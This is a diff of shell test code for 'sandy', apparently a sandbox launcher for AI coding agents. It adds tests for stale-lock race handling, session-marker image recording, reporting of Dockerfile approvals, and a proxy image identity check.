+    _s178_px_fields "$_S178_J" null null null "$_S178_ERR"
+_S178_J="$(_s178_state unreachable light)"
+check "§178(12c) docker unreachable (light): both keys present and null" \
+    _s178_px_fields "$_S178_J" null null null "$_S178_ERR"
+rm -f "$_S178_ERR"
+unset _S178_BUILD _S178_DF_SRC _S178_DF_EPOCH _S178_J _S178_ERR
+unset -f _s178_state _s178_px_fields
+
+rm -rf "$_S178_BIN" "$_S178_HOME" "$_S178_WSP" "$_S178_WSF" "$_S178_WSN"
+rm -f "$_S178_CALLS"
+unset _S178_BIN _S178_HOME _S178_WSP _S178_WSF _S178_WSN _S178_CALLS _S178_OUT _S178_RC _S178_PRIME_RC
+echo "§179: #158 — --doctor --fix re-checks a stale lock at removal time; one staleness predicate"
+# ============================================================
+# --doctor lists stale workspace locks early and removes them later, possibly
+# after a y/N. A launch in between can clear the same stale lock and re-take
+# the name with a LIVE pid; the old applier then rm -rf'd that live lock and a
+# second sandy could start on the workspace. The property asserted here is
+# that a lock which is live AT REMOVAL TIME survives --doctor --fix, however
+# the swap is timed.
+#
+# The swap is driven through the real `sandy --doctor --fix --yes` by a PATH
+# stub `cat` that watches reads of the lock's pid file (the lock predicate
+# reads it with cat; every other cat call is passed straight through). A
+# doctor --fix run reads the lock pid exactly three times: (1) the lister,
+# (2) the applier's re-check, (3) the re-check of what the atomic rename
+# moved -- the probe that produced this was recorded while writing §179, and
+# (1-pre) below re-proves the count, so a change in it fails loudly rather
+# than silently moving every swap to the wrong moment.
+#   pre    -- swap in a live lock BEFORE read 2 (list-then-apply race)
+#   mid    -- swap in a live lock AFTER read 2, before the rename (the rename
+#             then moves a live lock; only the post-rename re-check saves it)
+#   retake -- as mid, and a third launch takes the name before the moved
+#             lock can be restored: both live locks must survive
+# Each case has its OWN $SANDY_HOME (fixtures separated, §88b).
+_S179_SANDY="$SANDY_SCRIPT"
+_S179_D="$(cd "$(mktemp -d)" && pwd -P)"
+_S179_REALCAT="$(command -v cat)"
+mkdir -p "$_S179_D/bin"
+printf '#!/bin/sh\nexit 0\n' > "$_S179_D/bin/docker"
+chmod +x "$_S179_D/bin/docker"
+# The real cat path is baked in, so the stub still works under env -i (6).
+printf '#!/bin/sh\nS179_REALCAT="%s"\n' "$_S179_REALCAT" > "$_S179_D/bin/cat"
+cat >> "$_S179_D/bin/cat" <<'STUB'
+# Test stub: counts reads of $S179_L/pid and swaps the lock per $S179_MODE.
+_live() { rm -rf "$1"; mkdir "$1"; printf '%s\n' "$S179_LIVE" > "$1/pid"; printf '%s\n' "$2" > "$1/owner"; }
+if [ "$#" -eq 1 ] && [ -n "${S179_L:-}" ]; then
+    case "$1" in
+        "$S179_L/pid")
+            n=$(( $("$S179_REALCAT" "$S179_COUNT" 2>/dev/null || echo 0) + 1 ))
+            printf '%s\n' "$n" > "$S179_COUNT"
+            printf 'L%s\n' "$n" >> "$S179_COUNT.log"
+            if [ "$n" -eq 2 ] && [ "$S179_MODE" = "pre" ]; then
+                _live "$S179_L" B
+            fi
+            if [ "$n" -eq 2 ] && { [ "$S179_MODE" = "mid" ] || [ "$S179_MODE" = "retake" ]; }; then
+                "$S179_REALCAT" "$1"; rc=$?
+                _live "$S179_L" B
+                exit "$rc"
+            fi
+            ;;
+        "$S179_L".reap.*/pid)
+            printf 'M\n' >> "$S179_COUNT.log"
+            if [ "$S179_MODE" = "retake" ]; then
+                mkdir "$S179_L" && printf '%s\n' "$S179_LIVE" > "$S179_L/pid" && printf 'C\n' > "$S179_L/owner"
+            fi
+            ;;
+    esac
+fi
+exec "$S179_REALCAT" "$@"
+STUB
+chmod +x "$_S179_D/bin/cat"
+
+_s179_run() {  # $1 case (dir name) $2 mode -> doctor --fix --yes output; $1 is the home
+    local h="$_S179_D/$1"
+    mkdir -p "$h/sandboxes/.ws-$1.lock"
+    echo 999999 > "$h/sandboxes/.ws-$1.lock/pid"
+    printf 'A\n' > "$h/sandboxes/.ws-$1.lock/owner"
+    env PATH="$_S179_D/bin:$PATH" SANDY_HOME="$h" S179_L="$h/sandboxes/.ws-$1.lock" \
+        S179_MODE="$2" S179_LIVE="$$" S179_COUNT="$h.count" \
+        bash "$_S179_SANDY" --doctor --fix --yes 2>&1 || true
+}
+_s179_owner() { "$_S179_REALCAT" "$1/owner" 2>/dev/null || echo none; }
+_s179_reaps() { find "$1/sandboxes" -name '.*.lock.reap.*' -type d 2>/dev/null | wc -l | tr -d ' '; }
+
+# --- (1) the ordinary case: a stale lock is removed, nothing left behind ---
+_S179_OUT1="$(_s179_run plain none)"
+_H="$_S179_D/plain"
+check "§179(1-pre) doctor --fix reads the lock pid exactly list/re-check/moved (L1 L2 M) -- the swap timing below depends on it" \
+    bash -c '[ "$(tr "\n" " " < "$1")" = "L1 L2 M " ]' -- "$_H.count.log"
+check "§179(1) a provably stale lock is removed by --doctor --fix" \
+    test ! -e "$_H/sandboxes/.ws-plain.lock"
+check "§179(1) ...and no .reap.* takeover dir is left behind" \
+    test "$(_s179_reaps "$_H")" -eq 0
+check "§179(1) ...and it is counted as fixed" \
+    bash -c 'printf "%s" "$1" | grep -q "Fixed: 1 stale lock"' -- "$_S179_OUT1"
+
+# --- (2) pre: live lock swapped in between list and apply ---
+_S179_OUT2="$(_s179_run pre pre)"
+_H="$_S179_D/pre"
+check "§179(2) a lock re-taken by a live sandy between list and apply SURVIVES --doctor --fix" \
+    bash -c '[ "$(cat "$1/pid")" = "$2" ] && [ "$(cat "$1/owner")" = B ]' -- "$_H/sandboxes/.ws-pre.lock" "$$"
+check "§179(2) ...is reported as no longer stale, not as fixed" \
+    bash -c 'printf "%s" "$1" | grep -q "no longer stale" && printf "%s" "$1" | grep -q "Fixed: 0 stale lock"' -- "$_S179_OUT2"
+check "§179(2) ...and no .reap.* dir is left behind" \
+    test "$(_s179_reaps "$_H")" -eq 0
+
+# --- (3) mid: live lock swapped in after the re-check, before the rename ---
+_S179_OUT3="$(_s179_run mid mid)"
+_H="$_S179_D/mid"
+check "§179(3) the swap really landed between re-check and rename (the moved dir was read: L1 L2 M)" \
+    bash -c '[ "$(tr "\n" " " < "$1")" = "L1 L2 M " ]' -- "$_H.count.log"
+check "§179(3) a live lock the atomic rename moved is re-checked and PUT BACK, not deleted" \
+    bash -c '[ "$(cat "$1/pid")" = "$2" ] && [ "$(cat "$1/owner")" = B ]' -- "$_H/sandboxes/.ws-mid.lock" "$$"
+check "§179(3) ...no .reap.* dir left behind, and nothing counted as fixed" \
+    bash -c '[ "$2" -eq 0 ] && printf "%s" "$1" | grep -q "Fixed: 0 stale lock"' -- "$_S179_OUT3" "$(_s179_reaps "$_H")"
+
+# --- (4) retake: the name is taken again before the moved lock can go back ---
+_S179_OUT4="$(_s179_run retake retake)"
+_H="$_S179_D/retake"
+_S179_M4="$(find "$_H/sandboxes" -name '.ws-retake.lock.reap.*' -type d 2>/dev/null | head -n 1)"
+check "§179(4) the third launch's lock holds the name, untouched" \
+    bash -c '[ "$(cat "$1/owner")" = C ]' -- "$_H/sandboxes/.ws-retake.lock"
+check "§179(4) the displaced LIVE lock is left intact, not deleted, and not nested inside the new one" \
+    bash -c '[ -n "$1" ] && [ "$(cat "$1/pid")" = "$2" ] && [ "$(cat "$1/owner")" = B ] && [ -z "$(ls -A "$3" | grep reap)" ]' -- "$_S179_M4" "$$" "$_H/sandboxes/.ws-retake.lock"
+check "§179(4) ...and doctor names where it left it" \
+    bash -c 'printf "%s" "$1" | grep -qF "left at $2"' -- "$_S179_OUT4" "$_S179_M4"
+
+# --- (5) the helper, driven directly ---
+_S179_FNS="$(sed -n '/^_sandy_lock_state() {/,/^}$/p; /^_sandy_lock_is_stale() {/,/^}$/p; /^_sandy_lock_reap_stale() {/,/^}$/p' "$_S179_SANDY")"
+check "§179(5-pre) the three lock helpers were extracted and parse" \
+    bash -c 'printf "%s" "$1" | grep -q "^_sandy_lock_reap_stale() {" && bash -n -c "$1"' -- "$_S179_FNS"
+# A leftover takeover dir under this reaper pid must not swallow the lock
+# (mv into an existing directory nests); the leftover is left alone.
+check "§179(5a) a leftover .reap.<pid> dir is neither reused nor touched; the stale lock is still removed" \
+    bash -c 'set -euo pipefail; eval "$1"; d="$2/h5a"; mkdir -p "$d/.w.lock" "$d/.w.lock.reap.$$"; echo 999999 > "$d/.w.lock/pid"; : > "$d/.w.lock.reap.$$/keep"; rc=0; _sandy_lock_reap_stale "$d/.w.lock" || rc=$?; [ "$rc" -eq 0 ] && [ ! -e "$d/.w.lock" ] && [ -f "$d/.w.lock.reap.$$/keep" ] && [ "$(ls -d "$d"/.w.lock.reap.* | wc -l | tr -d " ")" -eq 1 ]' -- "$_S179_FNS" "$_S179_D"
+check "§179(5b) containment: a path that is not lock-dir shaped is never touched" \
+    bash -c 'set -euo pipefail; eval "$1"; d="$2/h5b/notalock"; mkdir -p "$d"; echo 999999 > "$d/pid"; rc=0; _sandy_lock_reap_stale "$d" || rc=$?; [ "$rc" -eq 1 ] && [ -f "$d/pid" ]' -- "$_S179_FNS" "$_S179_D"
+check "§179(5c) an unknown (pid-less) lock is never provably stale -- the launch mid-write window" \
+    bash -c 'set -euo pipefail; eval "$1"; d="$2/h5c/.w.lock"; mkdir -p "$d"; rc=0; _sandy_lock_reap_stale "$d" || rc=$?; _sandy_lock_state "$d"; [ "$rc" -eq 1 ] && [ -d "$d" ] && [ "$_SANDY_LOCK_STATE" = unknown ]' -- "$_S179_FNS" "$_S179_D"
+# The restore races a fresh mkdir of the name: `mv M L` into an existing L
+# NESTS M inside it. An mv shim lands that mkdir exactly between the helper's
+# existence test and its restoring rename; the nest must be undone (rc 3).
+check "§179(5d) a restore that lands inside a freshly re-taken lock dir is undone and reported (rc 3), never left nested" \
+    bash -c 'set -euo pipefail; eval "$1"; d="$2/h5d"; LIVE="$3"; mkdir -p "$d"; L="$d/.w.lock"; mkdir "$L"; echo 999999 > "$L/pid"; n=0; mv() { n=$((n+1)); if [ "$n" -eq 1 ]; then command mv "$@"; echo "$LIVE" > "$2/pid"; elif [ "$n" -eq 2 ]; then mkdir "$L"; echo C > "$L/owner"; command mv "$@"; else command mv "$@"; fi; }; rc=0; _sandy_lock_reap_stale "$L" || rc=$?; M="$_SANDY_LOCK_REAP_PATH"; [ "$rc" -eq 3 ] && [ "$(cat "$L/owner")" = C ] && [ -z "$(ls -A "$L" | grep reap || true)" ] && [ -n "$M" ] && [ "$(cat "$M/pid")" = "$3" ]' -- "$_S179_FNS" "$_S179_D" "$$"
+
+# --- (6) --print-state reports through the same predicate, stream contract intact ---
+_s179_ps() {  # $1 case $2 pid-file content ("" = no pid file) -> --print-state doc
+    local h="$_S179_D/ps-$1"
+    mkdir -p "$h/sandboxes/sb-$1/claude" "$h/sandboxes/.sb-$1.lock"
+    [ -z "$2" ] || printf '%s\n' "$2" > "$h/sandboxes/.sb-$1.lock/pid"
+    env -i PATH="$_S179_D/bin:$PATH" HOME="$_S179_D/nohome" SANDY_HOME="$h" bash "$_S179_SANDY" --print-state 2>"$h.err" || true
+}
+_S179_PS_STALE="$(_s179_ps stale 999999)"
+_S179_PS_LIVE="$(_s179_ps live "$$")"
+_S179_PS_UNK="$(_s179_ps unk "")"
+check "§179(6) --print-state: stale lock -> lock_holder_alive=false" \
+    bash -c 'printf "%s" "$1" | grep -q "\"lock_holder_alive\":false"' -- "$_S179_PS_STALE"
+check "§179(6) --print-state: live lock -> lock_holder_alive=true" \
+    bash -c 'printf "%s" "$1" | grep -q "\"lock_holder_alive\":true"' -- "$_S179_PS_LIVE"
+check "§179(6) --print-state: pid-less lock -> lock_holder_alive=null" \
+    bash -c 'printf "%s" "$1" | grep -q "\"lock_holder_alive\":null" && printf "%s" "$1" | grep -q "\"lock_held\":true"' -- "$_S179_PS_UNK"
+check "§179(6) --print-state wrote 0 bytes of stderr in all three cases" \
+    bash -c '[ ! -s "$1/ps-stale.err" ] && [ ! -s "$1/ps-live.err" ] && [ ! -s "$1/ps-unk.err" ]' -- "$_S179_D"
+
+# --- (7) SECONDARY, structural: all four sites go through the one helper ---
+check "§179(7) launch, --print-state, --doctor and --stop call the lock helpers (secondary to the property checks above)" \
+    bash -c 'grep -qF "_sandy_lock_state \"\$SANDY_WORKSPACE_LOCK\"" "$1" && grep -qF "_sandy_lock_reap_stale \"\$SANDY_WORKSPACE_LOCK\"" "$1" && grep -qF "_sandy_lock_state \"\$sb_lock_dir\"" "$1" && grep -qF "_sandy_lock_is_stale \"\$_d\"" "$1" && grep -qF "_sandy_lock_reap_stale \"\$_d\"" "$1" && grep -qF "_sandy_lock_reap_stale \"\$_sandy_stop_lock\"" "$1"' -- "$_S179_SANDY"
+check "§179(7) ...and none of them still carries its own kill -0 copy" \
+    bash -c '! grep -qE "kill -0 \"\\\$(sb_lock_pid|_holder_pid|_sandy_lock_pid|_pid)\"" "$1"' -- "$_S179_SANDY"
+
+rm -rf "$_S179_D"
+unset _S179_SANDY _S179_D _S179_REALCAT _S179_OUT1 _S179_OUT2 _S179_OUT3 _S179_OUT4 _S179_M4 _S179_FNS _S179_PS_STALE _S179_PS_LIVE _S179_PS_UNK _H
+unset -f _s179_run _s179_owner _s179_reaps _s179_ps 2>/dev/null || true
+echo "§180: the session marker records WHICH image ran, and --print-state reads it back (#295)"
+# ============================================================
+# WHY. The per-project gate FALLS BACK to the agent image on a decline or an
+# unanswerable prompt -- which is every non-TTY `--start` supervisor that meets
+# an unapproved .sandy/Dockerfile -- and nothing recorded which of the two ran.
+# "Did my project layer land?" had no answer in-container except observing its
+# effects (`ruby -v`), and none host-side at all. The marker now carries
+# image{name,id,project_layer}.
+#
+# The Phase 3 gate and the marker composer are EXTRACTED AND RUN together, so
+# (3) is the real property -- a declined Dockerfile really reads
+# project_layer:false -- not a grep for an assignment. Stubs cover only docker,
+# the gate's own verdict, and what the launch sets above each fragment.
+_S180_DIR="$(cd "$(mktemp -d)" && pwd -P)"
+python3 - "$SANDY_SCRIPT" "$_S180_DIR/phase3.sh" "$_S180_DIR/marker.sh" <<'S180_EXTRACT'
+import sys
+s = open(sys.argv[1]).read()
+i = s.index('PROJECT_DOCKERFILE="$WORK_DIR/.sandy/Dockerfile"\n')
+j = s.index('\n# --- Platform already detected', i)
+open(sys.argv[2], 'w').write(s[i:j] + '\n')
+i = s.index('# image (#295): WHICH image this launch runs')
+j = s.index('> "$_sandy_session_file"', i) + len('> "$_sandy_session_file"')
+open(sys.argv[3], 'w').write(s[i:j] + '\n')
+S180_EXTRACT
+check "§180(pre) the Phase 3 gate and the marker composer were extracted as balanced fragments" \
+    bash -c 'bash -n "$1" && bash -n "$2" && grep -q "_SANDY_PROJECT_LAYER=true" "$1" && grep -q "_sandy_image_json" "$2"' \
+    -- "$_S180_DIR/phase3.sh" "$_S180_DIR/marker.sh"
+
+_S180_A="sha256:$(printf 'a%.0s' 1 2 3 4 5 6 7 8 9 10 11 12)"
+_S180_B="sha256:$(printf 'b%.0s' 1 2 3 4 5 6 7 8 9 10 11 12)"
+# The approval stub records the context hash the way the real gate does, and
+# an approved build stages its context (§181), so the REAL _sandy_context_hash
+# and _sandy_stage_project_context are needed.
+eval "$(awk '/^_sandy_context_hash\(\) \{/,/^}$/' "$SANDY_SCRIPT")"
+eval "$(awk '/^_sandy_stage_project_context\(\) \{/,/^}$/' "$SANDY_SCRIPT")"
+# _s180_run <case> <dockerfile:y|n> <approve:y|n> <docker:up|down>
+# Runs gate + composer; prints the marker's image value (sorted keys), or
+# PARSE-FAIL. The marker file is left at $_S180_DIR/sb-<case>/sandy-session.json.
+_s180_run() {
+    (
+        trap - ERR
+        set +e
+        _c="$1"; _df="$2"; _S180_APPROVE="$3"; _S180_DOCKER="$4"
+        WORK_DIR="$_S180_DIR/ws-$_c"; rm -rf "$WORK_DIR"; mkdir -p "$WORK_DIR"
+        if [ "$_df" = y ]; then
+            mkdir -p "$WORK_DIR/.sandy"
+            printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN true\n' > "$WORK_DIR/.sandy/Dockerfile"
+        fi
+        SANDBOX_DIR="$_S180_DIR/sb-$_c"; rm -rf "$SANDBOX_DIR"; mkdir -p "$SANDBOX_DIR"
+        SANDBOX_NAME="Ws-deadbeef"; IMAGE_NAME=sandy-claude-code
+        NEEDS_BUILD=false; SKILLS_REBUILT=false
+        info() { :; }; warn() { :; }; error() { :; }
+        sha256() { shasum -a 256 2>/dev/null || sha256sum; }
+        _sandy_build_allowed() { return 0; }
+        _sandy_project_dockerfile_approved() { _SANDY_DF_HASH="$(_sandy_context_hash "$(dirname "$1")")"; [ "$_S180_APPROVE" = y ]; }
+        docker() {
+            local _a _n=""
+            for _a in "$@"; do _n="$_a"; done
+            [ "$_S180_DOCKER" = up ] || return 1
+            if [ "$1" = image ]; then
+                case "$_n" in
+                    (sandy-project-*) echo "$_S180_B" ;;
+                    (*)               echo "$_S180_A" ;;
+                esac
+            fi
+            return 0
+        }
+        . "$_S180_DIR/phase3.sh" >/dev/null 2>&1
+        sandy_full_version() { echo "2.7.0-test"; }
+        _sandy_egress_mode=permissive; SANDY_WORKSPACE=/w; _sandy_session_nonce=deadbeef
+        _sandy_effort_json=null; _sandy_perm_mode_json=null; _sandy_agents_json='["claude"]'
+        CRED_MODE=none
+        _sandy_session_file="$SANDBOX_DIR/sandy-session.json"
+        . "$_S180_DIR/marker.sh" >/dev/null 2>&1
+        python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1]))["image"], sort_keys=True))' \
+            "$_sandy_session_file" 2>/dev/null || echo PARSE-FAIL
+    ) 2>/dev/null
+    return 0
+}
+_S180_NONE="$(trap - ERR; _s180_run none n n up)"
+_S180_YES="$(trap - ERR;  _s180_run yes y y up)"
+_S180_NO="$(trap - ERR;   _s180_run no y n up)"
+_S180_DOWN="$(trap - ERR; _s180_run down n n down)"
+check "§180(1) no .sandy/Dockerfile: the agent image, its id, project_layer false (got: $_S180_NONE)" \
+    bash -c '[ "$1" = "{\"id\": \"$2\", \"name\": \"sandy-claude-code\", \"project_layer\": false}" ]' -- "$_S180_NONE" "$_S180_A"
+check "§180(2) an APPROVED Dockerfile: the project image by name, ITS id (not the parent's), project_layer true (got: $_S180_YES)" \
+    bash -c '[ "$1" = "{\"id\": \"$2\", \"name\": \"sandy-project-ws-deadbeef\", \"project_layer\": true}" ]' -- "$_S180_YES" "$_S180_B"
+# THE motivating case: a Dockerfile is present and the gate said no.
+check "§180(3) a DECLINED/unapproved Dockerfile falls back to the agent image, and the marker SAYS so: project_layer false (got: $_S180_NO)" \
+    bash -c '[ "$1" = "{\"id\": \"$2\", \"name\": \"sandy-claude-code\", \"project_layer\": false}" ]' -- "$_S180_NO" "$_S180_A"
+check "§180(4) docker cannot answer: id is null, never a guess, and the marker still parses (got: $_S180_DOWN)" \
+    bash -c '[ "$1" = "{\"id\": null, \"name\": \"sandy-claude-code\", \"project_layer\": false}" ]' -- "$_S180_DOWN"
+check "§180(5) the image value is ONE line in the marker, so a host reader takes it with one anchored match (§88b)" \
+    bash -c 'grep -q "^  \"image\": {\"name\": \"sandy-project-ws-deadbeef\", \"id\": \"sha256:b*\", \"project_layer\": true},$" "$1"' \
+    -- "$_S180_DIR/sb-yes/sandy-session.json"
+
+# --- --print-state reads it back, from the composer's REAL output ----------
+# One $SANDY_HOME per fixture, so the document is unambiguous without carving.
+_s180_ps() {   # _s180_ps <fixture> <marker-file-or-empty> [--light] -> sandboxes[0].image, or PARSE-FAIL
+    local h="$_S180_DIR/home-$1"
+    rm -rf "$h"; mkdir -p "$h/sandboxes/$1"
+    printf '{"workspace_path":"/nonexistent/%s"}\n' "$1" > "$h/sandboxes/$1/WORKSPACE.json"
+    [ -n "$2" ] && cp "$2" "$h/sandboxes/$1/sandy-session.json"
+    SANDY_HOME="$h" "$SANDY_SCRIPT" --print-state ${3:-} 2>/dev/null \
+        | python3 -c 'import json,sys; print(json.dumps(json.load(sys.stdin)["sandboxes"][0]["image"], sort_keys=True))' 2>/dev/null \
+        || echo PARSE-FAIL
+    return 0
+}
+# A marker from before the field existed: everything but the image line.
+grep -v '^  "image": ' "$_S180_DIR/sb-yes/sandy-session.json" > "$_S180_DIR/old.json" || true
+# A marker whose image line is not the shape sandy writes (truncated/foreign).
+sed 's/^  "image": .*/  "image": {"name": "x\\"}, "evil": 1,/' "$_S180_DIR/sb-yes/sandy-session.json" > "$_S180_DIR/bad.json"
+check "§180(6) --print-state reports the project image a launch recorded" \
+    bash -c '[ "$1" = "$2" ]' -- "$(trap - ERR; _s180_ps rt-yes "$_S180_DIR/sb-yes/sandy-session.json")" "$_S180_YES"
+check "§180(7) ...and the fallback, so a host-side consumer can see a declined layer" \
+    bash -c '[ "$1" = "$2" ]' -- "$(trap - ERR; _s180_ps rt-no "$_S180_DIR/sb-no/sandy-session.json")" "$_S180_NO"
+check "§180(8) a marker that PREDATES the field reads null (unknown), never the agent image" \
+    bash -c '[ "$1" = "null" ]' -- "$(trap - ERR; _s180_ps rt-old "$_S180_DIR/old.json")"
+check "§180(9) no marker at all reads null" \
+    bash -c '[ "$1" = "null" ]' -- "$(trap - ERR; _s180_ps rt-never "")"
+check "§180(10) an image line of a foreign shape reads null and the document still parses (stream contract)" \
+    bash -c '[ "$1" = "null" ]' -- "$(trap - ERR; _s180_ps rt-bad "$_S180_DIR/bad.json")"
+check "§180(11) emitted in LIGHT mode too (a marker read, no docker spawn)" \
+    bash -c '[ "$1" = "$2" ]' -- "$(trap - ERR; _s180_ps rt-light "$_S180_DIR/sb-yes/sandy-session.json" --light)" "$_S180_YES"
+check "§180(12) 0 bytes on stderr with a foreign image line (stream contract, §92/§93)" \
+    bash -c 'e="$(SANDY_HOME="$2" "$1" --print-state 2>&1 >/dev/null)"; [ -z "$e" ]' -- "$SANDY_SCRIPT" "$_S180_DIR/home-rt-bad"
+check "§180(13) the marker WRITES the key --print-state READS (mutation: rename either side and every sandbox reports null)" \
+    bash -c 'grep -qF "\\n  \"image\": %s," "$1" && grep -qF "s/^  \"image\": //p" "$1"' -- "$SANDY_SCRIPT"
+rm -rf "$_S180_DIR"
+unset _S180_DIR _S180_A _S180_B _S180_NONE _S180_YES _S180_NO _S180_DOWN
+unset -f _s180_run _s180_ps _sandy_context_hash _sandy_stage_project_context 2>/dev/null || true
+
+
+# ============================================================
+echo "§181: --print-state reports the .sandy/Dockerfile approvals (#296)"
+# ============================================================
+# WHY. `approvals` reads only passive-*.list, so of the three launch gates a
+# consumer could see the config-key approvals and not the one that authorizes
+# a HOST-side build with unfiltered network. dockerfile_approvals is additive:
+# a separate array, so `approvals` keeps its element shape.
+#
+# The fixture approval is written by the REAL gate, answered `y` on a pty
+# (it reads /dev/tty), so the reader is held to the writer's actual format
+# rather than to a hand-written imitation of it.
+_S181_DIR="$(cd "$(mktemp -d)" && pwd -P)"
+_S181_FN="$(awk '
+    /^sha256\(\)/ {print; next}
+    /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
+    /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
+' "$SANDY_SCRIPT")"
+cat > "$_S181_DIR/ptyyes.py" <<'PY'
+import os, pty, sys, select, time, signal
+pid, fd = pty.fork()
+if pid == 0:
+    try:
+        os.execvp(sys.argv[1], sys.argv[1:])
+    finally:
+        os._exit(127)
+buf = b''
+sent = False
+deadline = time.time() + 60
+while time.time() < deadline:
+    r, _, _ = select.select([fd], [], [], 0.5)
+    if fd in r:
+        try:
+            d = os.read(fd, 4096)
+        except OSError:
+            break
+        if not d:
+            break
+        buf += d
+        if not sent and b'[y/N]' in buf:
+            os.write(fd, b'y\n')
+            sent = True
+else:
+    os.kill(pid, signal.SIGKILL)
+os.waitpid(pid, 0)
+PY
+_S181_H="$_S181_DIR/home"; _S181_W="$_S181_DIR/ws"
+mkdir -p "$_S181_H" "$_S181_W/.sandy"
+printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN true\n' > "$_S181_W/.sandy/Dockerfile"
+if command -v python3 >/dev/null 2>&1; then
+    python3 "$_S181_DIR/ptyyes.py" bash -c "$_S181_FN"$'\n''WORK_DIR="$1" SANDY_HOME="$2" SANDY_AUTO_APPROVE_PRIVILEGED=0 _sandy_project_dockerfile_approved "$1/.sandy/Dockerfile"' _ "$_S181_W" "$_S181_H" >/dev/null 2>&1 || true
+fi
+_S181_H16="$(printf '%s' "$_S181_W" | { shasum -a 256 2>/dev/null || sha256sum; } | awk '{print $1}' | cut -c1-16)"
+_S181_CTX="$(bash -c "$_S181_FN"$'\n''_sandy_context_hash "$1"' _ "$_S181_W/.sandy")"
+check "§181(pre) the REAL gate, answered y on a pty, wrote the approval this section reads" \
+    test "$(head -n1 "$_S181_H/approvals/dockerfile-$_S181_H16.list" 2>/dev/null)" = "$_S181_CTX"
+# A passive-key approval beside it, to prove the two arrays stay separate.
+printf '%s\n# workspace: %s\n# approved:  2026-01-01T00:00:00Z\n' "$(printf 'k%.0s' 1 2 3)" "/elsewhere" > "$_S181_H/approvals/passive-1234567890abcdef.list"
+# _s181_q <home> <python expr over d> [--light] -> the expression's JSON, or PARSE-FAIL
+_s181_q() {
+    SANDY_HOME="$1" "$SANDY_SCRIPT" --print-state ${3:-} 2>/dev/null \
+        | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(eval(sys.argv[1]), sort_keys=True))' "$2" 2>/dev/null \
+        || echo PARSE-FAIL
+    return 0
+}
+_S181_ENTRY="$(_s181_q "$_S181_H" 'd["dockerfile_approvals"]')"
+check "§181(1) the approval is reported with the workspace hash, path hint and the context hash AS STORED (got: $_S181_ENTRY)" \
+    bash -c 'python3 -c "
+import json,sys
+a=json.loads(sys.argv[1]); assert len(a)==1, a; e=a[0]
+assert e[\"workspace_hash\"]==sys.argv[2], e
+assert e[\"workspace_path_hint\"]==sys.argv[3], e
+assert e[\"context_sha256\"]==sys.argv[4], e
+" "$1" "$2" "$3" "$4"' _ "$_S181_ENTRY" "$_S181_H16" "$_S181_W" "$_S181_CTX"
+check "§181(2) ...with the approval time the writer recorded, in UTC" \
+    bash -c 'python3 -c "
+import json,re,sys
+e=json.loads(sys.argv[1])[0]
+assert re.match(r\"^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$\", e[\"approved_at\"]), e
+" "$1"' _ "$_S181_ENTRY"
+check "§181(3) the two gates stay in separate arrays: approvals holds only the passive list, unchanged in shape (mutation: globbing *.list into either array mixes them)" \
+    bash -c '[ "$1" = "[\"1234567890abcdef\"]" ]' _ "$(_s181_q "$_S181_H" '[a["workspace_hash"] for a in d["approvals"]]')"
+# `light` is POSITIONAL: `--print-state --light` is read as full mode, so the
+# first draft of this check never exercised light mode. (4b) proves the mode
+# (light reports dangling_images as null; full counts them).
+check "§181(4) emitted in LIGHT mode too (a directory glob, no docker)" \
+    bash -c '[ "$1" = "$2" ]' _ "$(_s181_q "$_S181_H" 'd["dockerfile_approvals"]' light)" "$_S181_ENTRY"
+check "§181(4b) ...and that output really was light mode (dangling_images is null only there)" \
+    bash -c '[ "$1" = null ]' _ "$(_s181_q "$_S181_H" 'd["dangling_images"]' light)"
+mkdir -p "$_S181_DIR/empty/approvals" "$_S181_DIR/none"
+check "§181(5) an approvals dir with no Dockerfile approval reports [] -- present, not null" \
+    bash -c '[ "$1" = "[]" ]' _ "$(_s181_q "$_S181_DIR/empty" 'd["dockerfile_approvals"]')"
+check "§181(6) ...and so does a home with no approvals dir at all" \
+    bash -c '[ "$1" = "[]" ]' _ "$(_s181_q "$_S181_DIR/none" 'd["dockerfile_approvals"]')"
+# A hand-edited file with JSON metacharacters in every field.
+mkdir -p "$_S181_DIR/odd/approvals"
+printf 'ab"c\\d\n# workspace: /w "q" \\ x\n' > "$_S181_DIR/odd/approvals/dockerfile-ffffffffffffffff.list"
+check "§181(7) a hand-edited approval file keeps the one-document stream contract: parses, 0 bytes of stderr, missing approved_at reads \"\" like approvals does (§92/§93)" \
+    bash -c 'e="$(SANDY_HOME="$2" "$1" --print-state 2>&1 >/dev/null)"; [ -z "$e" ] && [ "$3" = "{\"approved_at\": \"\", \"context_sha256\": \"ab\\\"c\\\\d\", \"workspace_hash\": \"ffffffffffffffff\", \"workspace_path_hint\": \"/w \\\"q\\\" \\\\ x\"}" ]' \
+    _ "$SANDY_SCRIPT" "$_S181_DIR/odd" "$(_s181_q "$_S181_DIR/odd" 'd["dockerfile_approvals"][0]')"
+rm -rf "$_S181_DIR"
+unset _S181_DIR _S181_FN _S181_H _S181_W _S181_H16 _S181_CTX _S181_ENTRY
+unset -f _s181_q 2>/dev/null || true
+echo "§185: #299 — the proxy image about to run is checked against the identity this sandy computed; a mismatch WARNS, never refuses"
+# ============================================================
+# WHY. The proxy is the egress policy chokepoint, and its image only changes
+# when sandy rebuilds it. #218 (build resources unreachable) and #219
+# (SANDY_OFFLINE) both let a launch proceed on an older image rather than
+# lock the user out -- which for the proxy means the session enforces an OLDER
+# BUILD OF THE POLICY with nothing saying so. Commit ea92267 stamped the image
+# with sandy.proxy_src / sandy.proxy_epoch; this section is the half that
+# reads them back at launch. MAINTAINER DECISION: warn and proceed, never
+# refuse, consistent with #218/#219. So the properties asserted are:
+#   - a mismatch (either label) or a missing label is SAID, naming old vs
+#     expected, the chokepoint, and the fix;
+#   - a match is silent;
+#   - the launch is NOT refused: the helper returns 0 under set -e, and the
+#     real --build-only exits 0 and drops no .fatal marker;
+#   - the realistic path -- a #218-deferred proxy rebuild -- reaches it;
+#   - the session-end #218 notice repeats it;
+#   - no docker spawn is added to the introspection fast paths.
+# Each check was mutation-tested (see the commit).
+
